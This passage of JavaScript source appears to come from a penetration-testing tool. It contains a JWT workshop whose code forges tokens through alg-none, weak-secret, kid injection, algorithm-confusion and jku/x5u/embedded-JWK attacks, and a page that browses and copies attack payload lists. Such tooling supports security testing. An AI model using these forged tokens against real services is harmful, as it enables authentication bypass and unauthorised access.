    setPayloadJson(JSON.stringify(parsed.payload, null, 2));
  }

  function setParam(key, val) {
    setParams(p => ({ ...p, [key]: val }));
  }

  async function handleCraft() {
    let header, payload;
    try {
      header = JSON.parse(headerJson);
      payload = JSON.parse(payloadJson);
    } catch {
      toast.error('Invalid JSON in header or payload');
      return;
    }
    setCrafting(true);
    try {
      let token = '';

      if (activeAttack === 'alg_none') {
        const variant = params.algVariant || 'none';
        const h = b64urlEncode(JSON.stringify({ ...header, alg: variant }));
        const p = b64urlEncode(JSON.stringify(payload));
        token = `${h}.${p}.`;

      } else if (activeAttack === 'weak_secret') {
        const h = b64urlEncode(JSON.stringify({ ...header, alg: 'HS256' }));
        const p = b64urlEncode(JSON.stringify(payload));
        const sig = await hmacSign(h, p, params.secret || '');
        token = `${h}.${p}.${sig}`;

      } else if (activeAttack === 'kid_sqli' || activeAttack === 'kid_traversal') {
        const kidHeader = { ...header, alg: 'HS256' };
        if (params.kidValue !== undefined) kidHeader.kid = params.kidValue;
        const h = b64urlEncode(JSON.stringify(kidHeader));
        const p = b64urlEncode(JSON.stringify(payload));
        const sig = await hmacSign(h, p, params.secret || '');
        token = `${h}.${p}.${sig}`;

      } else if (activeAttack === 'alg_confusion') {
        const pubKey = (params.publicKey || '').trim();
        const h = b64urlEncode(JSON.stringify({ ...header, alg: 'HS256' }));
        const p = b64urlEncode(JSON.stringify(payload));
        const sig = await hmacSign(h, p, pubKey);
        token = `${h}.${p}.${sig}`;

      } else if (activeAttack === 'jku_inject') {
        const jkuHeader = { ...header };
        if (params.jkuUrl) jkuHeader.jku = params.jkuUrl;
        if (params.kid) jkuHeader.kid = params.kid;
        const h = b64urlEncode(JSON.stringify(jkuHeader));
        const p = b64urlEncode(JSON.stringify(payload));
        token = `${h}.${p}.<sign_with_your_RS256_private_key>`;

      } else if (activeAttack === 'x5u_inject') {
        const x5uHeader = { ...header };
        if (params.x5uUrl) x5uHeader.x5u = params.x5uUrl;
        const h = b64urlEncode(JSON.stringify(x5uHeader));
        const p = b64urlEncode(JSON.stringify(payload));
        token = `${h}.${p}.<sign_with_your_cert_private_key>`;

      } else if (activeAttack === 'embedded_jwk') {
        let jwk;
        try { jwk = JSON.parse(params.jwkJson || '{}'); } catch { toast.error('Invalid JWK JSON'); return; }
        const h = b64urlEncode(JSON.stringify({ ...header, jwk }));
        const p = b64urlEncode(JSON.stringify(payload));
        token = `${h}.${p}.<sign_with_your_RS256_private_key>`;
      }

      setOutput(token);
    } catch (e) {
      toast.error('Craft failed: ' + e.message);
    } finally {
      setCrafting(false);
    }
  }

  const attack = JWT_ATTACKS.find(a => a.id === activeAttack);

  return (
    <div className="space-y-4">
      {/* Decode input */}
      <div className="card p-4 space-y-3">
        <p className="text-xs font-medium text-text-secondary">Paste existing JWT to decode (optional)</p>
        <div className="flex gap-2">
          <input
            type="text"
            value={rawJwt}
            onChange={e => setRawJwt(e.target.value)}
            onKeyDown={e => e.key === 'Enter' && handleDecode()}
            placeholder="eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIn0.signature"
            className="input flex-1 text-xs font-mono"
          />
          <button onClick={handleDecode} className="btn-ghost text-xs px-4 shrink-0">Decode</button>
        </div>
        {parseError && <p className="text-xs text-red-400">{parseError}</p>}
        <div className="grid grid-cols-2 gap-3">
          <div>
            <p className="text-2xs text-text-muted mb-1 font-medium">Header (editable)</p>
            <textarea
              value={headerJson}
              onChange={e => setHeaderJson(e.target.value)}
              className="input w-full text-xs font-mono resize-none leading-relaxed"
              rows={5}
              spellCheck={false}
            />
          </div>
          <div>
            <p className="text-2xs text-text-muted mb-1 font-medium">Payload (editable)</p>
            <textarea
              value={payloadJson}
              onChange={e => setPayloadJson(e.target.value)}
              className="input w-full text-xs font-mono resize-none leading-relaxed"
              rows={5}
              spellCheck={false}
            />
          </div>
        </div>
      </div>

      {/* Attack tabs */}
      <div className="flex gap-1 flex-wrap">
        {JWT_ATTACKS.map(a => (
          <button
            key={a.id}
            onClick={() => setActiveAttack(a.id)}
            className={`px-3 py-1.5 rounded text-xs font-medium transition-colors ${
              activeAttack === a.id
                ? 'bg-accent/15 text-accent border border-accent/30'
                : 'text-text-muted hover:text-text-primary hover:bg-white/5 border border-transparent'
            }`}
          >
            {a.label}
          </button>
        ))}
      </div>

      {/* Attack panel */}
      {attack && (
        <div className="card p-4 space-y-4">
          <div>
            <p className="text-sm font-semibold text-text-primary">{attack.label}</p>
            <p className="text-xs text-text-muted mt-0.5">{attack.description}</p>
          </div>

          <div className="space-y-2">
            <p className="text-2xs font-medium text-text-muted uppercase tracking-wider">How to exploit</p>
            <ol className="space-y-1.5">
              {attack.instructions.map((step, i) => (
                <li key={i} className="flex gap-2.5 text-xs text-text-secondary">
                  <span className="text-accent font-mono shrink-0 mt-0.5">{i + 1}.</span>
                  <span className="leading-relaxed">{step}</span>
                </li>
              ))}
            </ol>
          </div>

          {attack.fields && attack.fields.length > 0 && (
            <div className="space-y-3 pt-1 border-t border-border">
              <p className="text-2xs font-medium text-text-muted uppercase tracking-wider pt-1">Parameters</p>
              {attack.fields.map(field => (
                <div key={field.key}>
                  <label className="text-2xs text-text-secondary block mb-1">{field.label}</label>
                  {field.type === 'select' ? (
                    <select
                      value={params[field.key] ?? field.options[0]}
                      onChange={e => setParam(field.key, e.target.value)}
                      className="input text-xs py-1.5 w-auto"
                    >
                      {field.options.map(opt => (
                        <option key={opt} value={opt}>{opt}</option>
                      ))}
                    </select>
                  ) : field.type === 'textarea' ? (
                    <textarea
                      value={params[field.key] || ''}
                      onChange={e => setParam(field.key, e.target.value)}
                      placeholder={field.placeholder}
                      className="input w-full text-xs font-mono resize-none leading-relaxed"
                      rows={4}
                      spellCheck={false}
                    />
                  ) : (
                    <input
                      type="text"
                      value={params[field.key] || ''}
                      onChange={e => setParam(field.key, e.target.value)}
                      placeholder={field.placeholder}
                      className="input w-full text-xs font-mono"
                    />
                  )}
                </div>
              ))}
            </div>
          )}

          <button
            onClick={handleCraft}
            disabled={crafting}
            className="btn-ghost text-xs flex items-center gap-1.5 disabled:opacity-50"
          >
            <Crosshair className="w-3.5 h-3.5" />
            {crafting ? 'Crafting…' : 'Craft Token'}
          </button>
        </div>
      )}

      {/* Output */}
      {output && (
        <div className="card p-4 space-y-3">
          <div className="flex items-center justify-between">
            <p className="text-xs font-medium text-text-secondary">Crafted JWT</p>
            <div className="flex gap-2">
              <button
                onClick={() => copyToClipboard(output, 'JWT')}
                className="flex items-center gap-1 px-2 py-1 rounded text-xs bg-accent/10 text-accent hover:bg-accent/20 transition-colors"
              >
                <Copy className="w-3 h-3" /> Copy
              </button>
              <button
                onClick={() => copyToClipboard(`Authorization: Bearer ${output}`, 'Authorization header')}
                className="flex items-center gap-1 px-2 py-1 rounded text-xs bg-white/5 text-text-secondary hover:bg-white/10 transition-colors"
              >
                <Copy className="w-3 h-3" /> As Header
              </button>
            </div>
          </div>
          <code className="block text-xs font-mono text-text-primary break-all whitespace-pre-wrap leading-relaxed bg-white/[0.03] p-3 rounded-lg border border-border">
            {output}
          </code>
        </div>
      )}
    </div>
  );
}

// ──────────────────────────────────────────────────────────────────────────────

const PLATFORM_LABELS = { linux: 'Linux', windows: 'Windows', any: 'Any' };

function PlatformBadge({ platform }) {
  if (!platform || platform === 'any') return null;
  return (
    <span className={`inline-flex items-center px-1.5 py-0.5 rounded text-2xs font-medium shrink-0 ${
      platform === 'linux'
        ? 'bg-green-500/10 text-green-400 border border-green-500/20'
        : 'bg-blue-500/10 text-blue-400 border border-blue-500/20'
    }`}>
      {PLATFORM_LABELS[platform]}
    </span>
  );
}

function copyToClipboard(text, label) {
  navigator.clipboard.writeText(text)
    .then(() => toast.success(`Copied: ${label}`))
    .catch(() => toast.error('Copy failed'));
}

function PayloadRow({ payload }) {
  return (
    <div className="group flex items-start gap-3 px-4 py-2.5 border-b border-border last:border-b-0 hover:bg-white/[0.03] transition-colors">
      <div className="flex-1 min-w-0">
        <div className="flex items-center gap-2 mb-1">
          <p className="text-xs text-text-muted">{payload.label}</p>
          <PlatformBadge platform={payload.platform} />
        </div>
        <code className="text-xs font-mono text-text-primary break-all whitespace-pre-wrap leading-relaxed">
          {payload.value}
        </code>
      </div>
      <div className="flex gap-1.5 shrink-0 mt-4 opacity-0 group-hover:opacity-100 transition-opacity">
        <button
          onClick={() => copyToClipboard(payload.value, payload.label)}
          className="flex items-center gap-1 px-2 py-1 rounded text-xs bg-accent/10 text-accent hover:bg-accent/20 transition-colors"
          title="Copy"
        >
          <Copy className="w-3 h-3" />
          Copy
        </button>
        <button
          onClick={() => copyToClipboard(encodeURIComponent(payload.value), payload.label + ' (URL encoded)')}
          className="flex items-center gap-1 px-2 py-1 rounded text-xs bg-white/5 text-text-secondary hover:bg-white/10 transition-colors"
          title="Copy URL encoded"
        >
          <Link2 className="w-3 h-3" />
          URL
        </button>
      </div>
    </div>
  );
}

export default function Payloads() {
  const [activeId, setActiveId] = useState(CATEGORIES[0].id);
  const [search, setSearch] = useState('');
  const [platformFilter, setPlatformFilter] = useState('all'); // 'all' | 'linux' | 'windows'
  const [dbFilter, setDbFilter] = useState('all'); // 'all' | 'generic' | 'mysql' | 'mssql' | 'postgresql' | 'oracle' | 'sqlite'

  const active = CATEGORIES.find(c => c.id === activeId);
  const isSqli = activeId === 'sqli';

  const filteredPayloads = useMemo(() => {
    if (!active) return [];
    let list = active.payloads;
    if (platformFilter !== 'all') {
      list = list.filter(p => !p.platform || p.platform === platformFilter);
    }
    if (isSqli && dbFilter !== 'all') {
      list = list.filter(p => p.dbType === dbFilter);
    }
    const q = search.trim().toLowerCase();
    if (q) {
      list = list.filter(p =>
        p.label.toLowerCase().includes(q) || p.value.toLowerCase().includes(q)
      );
    }
    return list;
  }, [active, search, platformFilter, dbFilter, isSqli]);

  const copyAll = () => {
    const text = filteredPayloads.map(p => p.value).join('\n');
    copyToClipboard(text, `all ${active.label} payloads`);
  };

  return (
    <div>
      <div className="page-header">
        <h1 className="page-title flex items-center gap-2">
          <Crosshair className="w-5 h-5" /> Payloads
        </h1>
      </div>

      <div className="flex gap-4">
        {/* Category sidebar */}
        <div className="w-44 shrink-0">
          <div className="card p-1.5 space-y-0.5 sticky top-0">
            {CATEGORIES.map(c => (
              <button
                key={c.id}
                onClick={() => { setActiveId(c.id); setSearch(''); setDbFilter('all'); }}
                className={`w-full text-left px-3 py-2 rounded-lg text-sm font-medium transition-colors ${
                  activeId === c.id
                    ? 'bg-accent/[0.14] text-accent'
                    : 'text-text-muted hover:text-text-primary hover:bg-white/5'
                }`}
              >
                {c.label}
                <span className="block text-2xs font-normal text-text-muted mt-0.5 truncate">
                  {c.description}
                </span>
              </button>
            ))}
          </div>
        </div>

        {/* Payload list / Workshop */}
        <div className="flex-1 min-w-0">
          {activeId === 'jwt' ? (
            <JWTWorkshop />
          ) : activeId === 'saml' ? (
            <SAMLWorkshop />
          ) : (
            <>
              <div className="flex flex-col gap-2 mb-3">
                <div className="flex items-center gap-2 flex-wrap">
                  <div className="relative flex-1 max-w-sm">
                    <Search className="absolute left-3 top-1/2 -translate-y-1/2 w-3.5 h-3.5 text-text-muted pointer-events-none" />
                    <input
                      type="search"
                      className="input pl-8 text-sm py-1.5"
                      placeholder="Filter payloads…"
                      value={search}
                      onChange={e => setSearch(e.target.value)}
                      autoComplete="off"
                    />
                  </div>
                  {/* Platform filter */}
                  <div className="flex gap-1 shrink-0">
                    {[
                      { key: 'all', label: 'All' },
                      { key: 'linux', label: 'Linux' },
                      { key: 'windows', label: 'Windows' },
                    ].map(({ key, label }) => (
                      <button
                        key={key}
                        onClick={() => setPlatformFilter(key)}
                        className={`px-2.5 py-1 rounded text-xs font-medium transition-colors ${
                          platformFilter === key
                            ? key === 'linux'
                              ? 'bg-green-500/15 text-green-400 border border-green-500/30'
                              : key === 'windows'
                              ? 'bg-blue-500/15 text-blue-400 border border-blue-500/30'
                              : 'bg-accent/15 text-accent border border-accent/30'
                            : 'text-text-muted hover:text-text-primary hover:bg-white/5 border border-transparent'
                        }`}
                      >
                        {label}
                      </button>
                    ))}
                  </div>
                  <span className="text-xs text-text-muted shrink-0">
                    {filteredPayloads.length} payload{filteredPayloads.length !== 1 ? 's' : ''}
                  </span>
                  <button
                    onClick={copyAll}
                    className="btn-ghost text-xs flex items-center gap-1.5 shrink-0"
                    title="Copy all visible payloads"
                  >
                    <Copy className="w-3.5 h-3.5" /> Copy all
                  </button>
                </div>
                {/* DB type filter — SQLi only */}
                {isSqli && (
                  <div className="flex gap-1 flex-wrap">
                    {[
                      { key: 'all', label: 'All DBs' },
                      { key: 'generic', label: 'Generic' },
                      { key: 'mysql', label: 'MySQL' },
                      { key: 'mssql', label: 'MSSQL' },
                      { key: 'postgresql', label: 'PostgreSQL' },
                      { key: 'oracle', label: 'Oracle' },
                      { key: 'sqlite', label: 'SQLite' },
                    ].map(({ key, label }) => (
                      <button
                        key={key}
                        onClick={() => setDbFilter(key)}
                        className={`px-2.5 py-1 rounded text-xs font-medium transition-colors ${
                          dbFilter === key
                            ? 'bg-purple-500/15 text-purple-400 border border-purple-500/30'
                            : 'text-text-muted hover:text-text-primary hover:bg-white/5 border border-transparent'
                        }`}
                      >
                        {label}
                      </button>
                    ))}
                  </div>
                )}
              </div>

              <div className="card p-0 overflow-hidden">
                {filteredPayloads.length === 0 ? (
                  <p className="px-4 py-8 text-center text-sm text-text-muted">No payloads match this filter.</p>
                ) : (
                  filteredPayloads.map((p, i) => <PayloadRow key={i} payload={p} />)
                )}
              </div>
            </>
          )}
        </div>
      </div>
    </div>
  );
}
